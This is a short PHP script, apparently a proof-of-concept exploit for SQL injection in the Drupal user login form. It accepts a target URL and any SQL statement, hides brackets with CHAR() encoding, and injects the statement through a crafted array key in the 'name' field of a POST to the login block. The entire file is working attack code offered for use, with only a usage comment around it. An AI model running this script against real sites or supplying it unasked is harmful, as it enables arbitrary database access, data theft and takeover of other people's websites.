<?php
/**
 * The contents of $sql will be injected into a Drupal site located at $url
 *
 * @usage
 * php /path/to/this/file.php 'http://example.com' 'SELECT * FROM node'
 */
$url = $argv[1];
$sql = $argv[2];

$sql =   str_replace('{', '\' , CHAR(123), \'', $sql);
$sql =   str_replace('}', '\' , CHAR(125), \'', $sql);
$sql =   str_replace('[', '\' , CHAR(91), \'', $sql);
$sql =   str_replace(']', '\' , CHAR(93), \'', $sql);

$sql = urlencode($sql);

//Send a request to the user login form
$post_data = "name[0%20;" . $sql . ";;#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
$params = array(
    'http' => array(
    'method' => 'POST',
    'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
    'content' => $post_data
  )
);
$ctx = stream_context_create($params);
$data = file_get_contents($url . '?q=node&destination=node', 1, $ctx);
